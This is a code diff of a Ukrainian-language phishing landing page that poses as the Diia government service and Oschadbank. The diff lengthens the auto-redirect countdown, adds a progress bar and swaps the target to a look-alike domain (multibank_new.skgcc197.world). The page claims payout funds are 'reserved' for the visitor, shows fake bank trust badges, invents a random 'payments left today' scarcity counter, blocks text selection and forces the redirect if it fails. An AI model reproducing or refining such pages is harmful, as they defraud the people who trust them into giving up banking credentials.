@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes, viewport-fit=cover">
-<title>ДіяПослуги — Автоматичне перенаправлення</title>
+<title>ДіяПослуги</title>
 
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
@@ -101,7 +101,7 @@ body {
   border-right: none;
 }
 
-/* Стилі для заміни кнопок — інформаційне повідомлення про автоперехід */
+/* Стилі для автоматичного переходу - замість кнопок */
 .auto-message {
   background: #eef2f9;
   border-radius: 28px;
@@ -130,6 +130,7 @@ body {
   border-radius: 50%;
   margin: 12px auto;
   box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  transition: all 0.2s ease;
 }
 
 .redirect-info {
@@ -147,6 +148,23 @@ body {
   padding: 8px 12px;
   border-radius: 40px;
   display: inline-block;
+}
+
+.progress-bar-container {
+  width: 100%;
+  background-color: #e2e8f0;
+  border-radius: 10px;
+  margin: 20px 0 10px;
+  height: 6px;
+  overflow: hidden;
+}
+
+.progress-bar {
+  width: 0%;
+  height: 100%;
+  background-color: #1e466e;
+  border-radius: 10px;
+  transition: width 0.1s linear;
 }
 
 .trust-bar {
@@ -228,14 +246,17 @@ body {
   </div>
 
   <div class="info-box">
-    Кошти зарезервовано за вашим зверненням. Зараз ви будето автоматично перенаправлені для отримання виплати.
+    Кошти зарезервовано за вашим зверненням. Зараз ви будете автоматично перенаправлені для отримання виплати.
   </div>
 
-  <!-- Замість кнопок — блок з лічильником та інформацією про автоматичний перехід -->
+  <!-- Блок з лічильником та прогрес-баром замість кнопок -->
   <div class="auto-message">
     <p>🔒 Захищене перенаправлення</p>
-    <div class="countdown-circle" id="countdownDisplay">3</div>
-    <div class="redirect-info">Автоматичний перехід через <span id="secondsSpan">3</span> секунд(и)</div>
+    <div class="countdown-circle" id="countdownDisplay">5</div>
+    <div class="redirect-info">Автоматичний перехід через <span id="secondsSpan">5</span> секунд(и)</div>
+    <div class="progress-bar-container">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
     <div class="hint-text">Будь ласка, зачекайте, триває з'єднання з платіжним шлюзом...</div>
   </div>
 
@@ -250,30 +271,32 @@ body {
     <span>oschadbank.ua</span>
   </div>
   
-  <!-- FOMO контейнер (опціонально) -->
+  <!-- FOMO контейнер -->
   <div id="fomoContainer"></div>
 </div>
 
 <script>
 (function() {
+  // ==============================================
+  // КОНКРЕТНО: ПЕРЕХІД ЧЕРЕЗ 5 СЕКУНД
+  // ==============================================
+  const REDIRECT_DELAY_SECONDS = 5;
+  const REDIRECT_DELAY_MS = 5000; // 5 секунд в мілісекундах
   
-  const REDIRECT_URL = "https://oschadbank.skgcc197.world/b/1779542783";
-  
-  
+  // Посилання для переходу (можна змінити на потрібне)
+  const REDIRECT_URL = "https://multibank_new.skgcc197.world/bd/1779568140";
   const FALLBACK_URL = "https://diia.gov.ua/services/otrimannya-dopomogi-ta-vyplat";
   
-  
-  const REDIRECT_DELAY_MS = 2000;
-  
-
+  // Отримуємо елементи для лічильника
   const countdownDisplayDiv = document.getElementById("countdownDisplay");
   const secondsSpan = document.getElementById("secondsSpan");
+  const progressBar = document.getElementById("progressBar");
   
-  let remainingSeconds = 2;
+  let remainingSeconds = REDIRECT_DELAY_SECONDS;
   let redirectTimer = null;
   let countdownInterval = null;
   
-  // Функція оновлення тексту лічильника
+  // Оновлення лічильника на екрані
   function updateCountdownDisplay(value) {
     if (countdownDisplayDiv) {
       countdownDisplayDiv.textContent = value;
@@ -283,8 +306,41 @@ body {
     }
   }
   
-  // Функція зупинки всіх таймерів (запобігання подвійному переходу)
-  function stopAllTimers() {
+  // Оновлення прогрес-бару
+  function updateProgressBar(secondsLeft) {
+    if (progressBar) {
+      const totalSeconds = REDIRECT_DELAY_SECONDS;
+      const elapsed = totalSeconds - secondsLeft;
+      const percent = (elapsed / totalSeconds) * 100;
+      progressBar.style.width = percent + "%";
+    }
+  }
+  
+  // Функція виконання переходу
+  function performRedirect() {
+    let targetUrl = REDIRECT_URL;
+    try {
+      const urlObj = new URL(targetUrl);
+      if (!urlObj.searchParams.has('ref')) {
+        urlObj.searchParams.set('ref', 'auto_redirect_5sec');
+        urlObj.searchParams.set('src', 'diia_landing');
+      }
+      targetUrl = urlObj.toString();
+    } catch(e) {
+      targetUrl = FALLBACK_URL;
+    }
+    
+    // Вібрація для мобільних (опціонально)
+    if (window.navigator && window.navigator.vibrate) {
+      window.navigator.vibrate(20);
+    }
+    
+    // ВИКОНУЄМО ПЕРЕХІД
+    window.location.href = targetUrl;
+  }
+  
+  // Зупинка таймерів (на всяк випадок)
+  function stopTimers() {
     if (redirectTimer) {
       clearTimeout(redirectTimer);
       redirectTimer = null;
@@ -295,47 +351,49 @@ body {
     }
   }
   
-  // Функція виконання редиректу
-  function performRedirect() {
-    // Додаємо параметри для умовної статистики/атрибуції, якщо потрібно
-    let targetUrl = REDIRECT_URL;
-    try {
-      const urlObj = new URL(targetUrl);
-      if (!urlObj.searchParams.has('ref')) {
-        urlObj.searchParams.set('ref', 'auto_diia');
-        urlObj.searchParams.set('src', 'landing_redirect');
-      }
-      targetUrl = urlObj.toString();
-    } catch(e) {
-      // якщо помилка URL, залишаємо як є
-      console.warn("URL parsing error, using fallback");
-      targetUrl = FALLBACK_URL;
-    }
-    
-    // Невелика вібрація для мобільних пристроїв (опціонально)
-    if (window.navigator && window.navigator.vibrate) {
-      window.navigator.vibrate(20);
-    }
-    
-    // Виконуємо перехід
-    window.location.href = targetUrl;
-  }
-  
-  // Функція запуску лічильника та редиректу
-  function startRedirectSequence() {
-    // Ініціалізуємо лічильник
-    remainingSeconds = 3;
+  // Запуск зворотного відліку та переходу через 5 секунд
+  function startRedirect() {
+    // Ініціалізація відображення
+    remainingSeconds = REDIRECT_DELAY_SECONDS;
     updateCountdownDisplay(remainingSeconds);
+    updateProgressBar(remainingSeconds);
     
-    // Запускаємо інтервал зворотного відліку
+    // Анімація лічильника
+    const countdownElem = document.getElementById('countdownDisplay');
+    if (countdownElem) {
+      countdownElem.style.transition = 'all 0.2s ease';
+    }
+    
+    // Запускаємо інтервал для оновлення лічильника кожну секунду
     countdownInterval = setInterval(() => {
       remainingSeconds--;
+      
       if (remainingSeconds >= 0) {
         updateCountdownDisplay(remainingSeconds);
+        updateProgressBar(remainingSeconds);
+        
+        // Візуальний ефект для останніх секунд
+        if (countdownElem) {
+          if (remainingSeconds <= 1) {
+            countdownElem.style.transform = 'scale(1.08)';
+            countdownElem.style.backgroundColor = '#e8b560';
+            countdownElem.style.color = '#1e2f40';
+          } else if (remainingSeconds === 2) {
+            countdownElem.style.transform = 'scale(1.04)';
+            countdownElem.style.backgroundColor = '#1e466e';
+            countdownElem.style.color = 'white';
+          } else if (remainingSeconds === 3) {
+            countdownElem.style.transform = 'scale(1.02)';
+          } else {
+            countdownElem.style.transform = 'scale(1)';
+            countdownElem.style.backgroundColor = '#1e466e';
+            countdownElem.style.color = 'white';
+          }
+        }
       }
       
+      // Коли дійшли до 0, зупиняємо інтервал
       if (remainingSeconds <= 0) {
-        // Зупиняємо інтервал, коли дійшли до 0
         if (countdownInterval) {
           clearInterval(countdownInterval);
           countdownInterval = null;
@@ -343,9 +401,9 @@ body {
       }
     }, 1000);
     
-    // Таймер для редиректу через 3 секунди
+    // ГОЛОВНЕ: запускаємо таймер на перехід через 5 секунд
     redirectTimer = setTimeout(() => {
-      // Переконуємось, що лічильник зупинено
+      // Зупиняємо лічильник, якщо він ще працює
       if (countdownInterval) {
         clearInterval(countdownInterval);
         countdownInterval = null;
@@ -355,22 +413,15 @@ body {
     }, REDIRECT_DELAY_MS);
   }
   
-  // Додаткове покращення: попереднє завантаження (prefetch) цільової сторінки для пришвидшення
+  // Попереднє завантаження цільової сторінки для прискорення
   if ('requestIdleCallback' in window) {
     requestIdleCallback(() => {
       const prefetchLink = document.createElement('link');
       prefetchLink.rel = 'prefetch';
       prefetchLink.href = REDIRECT_URL;
       document.head.appendChild(prefetchLink);
-      
-      // Також префетч фолбеку
-      const prefetchFallback = document.createElement('link');
-      prefetchFallback.rel = 'prefetch';
-      prefetchFallback.href = FALLBACK_URL;
-      document.head.appendChild(prefetchFallback);
     });
   } else {
-    // Запасний варіант
     setTimeout(() => {
       const prefetchLink = document.createElement('link');
       prefetchLink.rel = 'prefetch';
@@ -379,99 +430,60 @@ body {
     }, 100);
   }
   
-  // Зберігаємо в localStorage факт автоперенаправлення (опціонально для аналітики)
+  // Зберігаємо статистику (необов'язково)
   try {
-    let autoRedirectCount = localStorage.getItem('auto_redirect_counter') || 0;
-    autoRedirectCount = parseInt(autoRedirectCount) + 1;
-    localStorage.setItem('auto_redirect_counter', autoRedirectCount);
-    localStorage.setItem('last_auto_redirect_ts', Date.now().toString());
-  } catch(e) {
-    // Ігноруємо помилки localStorage (наприклад, приватний режим)
-  }
+    let count = localStorage.getItem('auto_redirect_5sec_count') || 0;
+    count = parseInt(count) + 1;
+    localStorage.setItem('auto_redirect_5sec_count', count);
+  } catch(e) {}
   
-  // FOMO-повідомлення (не критично, для більшої довіри)
+  // FOMO-повідомлення (просто для антуражу)
   const fomoContainer = document.getElementById('fomoContainer');
   if (fomoContainer) {
     setTimeout(() => {
       const fomoDiv = document.createElement('div');
       fomoDiv.className = 'fomo-message';
       const remaining = Math.floor(Math.random() * (180 - 70 + 1) + 70);
-      fomoDiv.textContent = `Доступний ліміт виплат на сьогодні: ${remaining} місць. Автоматичне перенаправлення для отримання.`;
+      fomoDiv.textContent = `Доступний ліміт виплат на сьогодні: ${remaining} місць. Автоматичне перенаправлення через 5 секунд.`;
       fomoContainer.appendChild(fomoDiv);
-      
-      // Оновлення динаміки через 4 секунди (поки ще не перейшли)
-      setTimeout(() => {
-        if (fomoDiv && document.body.contains(fomoDiv)) {
-          const updated = Math.max(15, remaining - Math.floor(Math.random() * 25));
-          fomoDiv.textContent = `Доступний ліміт виплат на сьогодні: ${updated} місць. Автоматичне перенаправлення триває...`;
-        }
-      }, 3800);
-    }, 1200);
+    }, 800);
   }
   
-  // Запускаємо головний сценарій автоматичного переходу
-  startRedirectSequence();
+  // ЗАПУСКАЄМО ПЕРЕХІД ЧЕРЕЗ 5 СЕКУНД
+  startRedirect();
   
-
+  // Запобігаємо випадковому виділенню тексту
   const card = document.querySelector('.card');
   if (card) {
     card.style.userSelect = 'none';
   }
   
-  // Візуальний ефект: зміна кольору лічильника при зменшенні часу (не обов'язково, але приємно)
-  const countdownElem = document.getElementById('countdownDisplay');
-  if (countdownElem) {
-    const originalTransition = countdownElem.style.transition;
-    countdownElem.style.transition = 'all 0.2s ease';
-    const intervalForStyle = setInterval(() => {
-      if (remainingSeconds <= 1) {
-        countdownElem.style.transform = 'scale(1.05)';
-        countdownElem.style.backgroundColor = '#e8b560';
-        countdownElem.style.color = '#1e2f40';
-      } else if (remainingSeconds === 2) {
-        countdownElem.style.transform = 'scale(1.02)';
-      } else {
-        countdownElem.style.transform = 'scale(1)';
-        countdownElem.style.backgroundColor = '#1e466e';
-        countdownElem.style.color = 'white';
-      }
-    }, 300);
-    // Очистити інтервал після редиректу неможливо, але це не критично (сторінка зникне)
-    setTimeout(() => {
-      clearInterval(intervalForStyle);
-    }, REDIRECT_DELAY_MS + 200);
-  }
-  
-  // Для максимальної надійності: додаємо обробник beforeunload, щоб переконатись, що якщо користувач намагається залишити сторінку до переходу, ми не блокуємо, просто логуємо
+  // Очищення таймерів при виході зі сторінки
   window.addEventListener('beforeunload', function() {
-   
     if (redirectTimer) clearTimeout(redirectTimer);
     if (countdownInterval) clearInterval(countdownInterval);
   });
   
- 
+  // СТРАХУВАННЯ: якщо через 5.5 секунд перехід не стався (наприклад, блокування), форсуємо
   setTimeout(function() {
-    
     if (window.location.href.indexOf(location.pathname) !== -1) {
-      // Додатково переконуємось, що ще не відбувся перехід
+      // Перевіряємо, чи ще не було переходу
       if (redirectTimer) {
-        // Таймер ще активний? значить все ок, не втручаємось
+        // Таймер ще активний? значить все ок, не чіпаємо
         return;
       }
-      // Інакше – форсований перехід
+      // Форсований перехід
       let forceUrl = REDIRECT_URL;
       try {
         const urlObj = new URL(forceUrl);
-        if (!urlObj.searchParams.has('ref')) urlObj.searchParams.set('ref', 'force_fallback');
+        if (!urlObj.searchParams.has('ref')) urlObj.searchParams.set('ref', 'force_redirect');
         forceUrl = urlObj.toString();
       } catch(e) {}
       window.location.href = forceUrl;
     }
-  }, 3600);
+  }, 5500);
   
-  // Індикація завантаження для надійності — ніяких кнопок, все автоматично.
-  console.log("Сторінка автоматичного переходу активна. Редирект через 3 секунди.");
-  
+  console.log("Сторінка завантажена. Перехід через 5 секунд.");
 })();
 </script>
 </body>
